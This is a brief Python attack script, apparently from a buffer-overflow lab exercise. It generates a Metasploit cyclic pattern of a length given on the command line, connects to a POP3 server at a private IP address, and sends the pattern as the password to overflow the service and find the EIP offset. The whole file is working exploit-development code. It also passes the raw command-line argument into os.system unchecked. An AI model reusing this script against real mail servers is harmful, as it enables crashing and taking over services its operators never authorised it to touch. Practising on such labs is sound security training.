#!/usr/bin/python3
import socket
import os
import sys
if len(sys.argv) != 2:
    print("you need a para such as 2700 to exec a bufferoverflow")
    sys.exit()
# test the location of eip
os.system('cd /usr/share/metasploit-framework/tools/exploit/ && ./pattern_create.rb -l ' + sys.argv[1] + ' > ~/Desktop/buffer.txt')
f = open("/home/xjj/Desktop/buffer.txt", "r")
data = str(f.read())
f.close()
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.121", 110))
    print(s.recv(1024))
    s.send(b"USER admin\r\n")
    print(s.recv(1024))
    s.send(b"PASS " + bytes(data, encoding="utf-8") + b"\r\n")
    print("Done!")
except:
    print("could not connect to pop3")
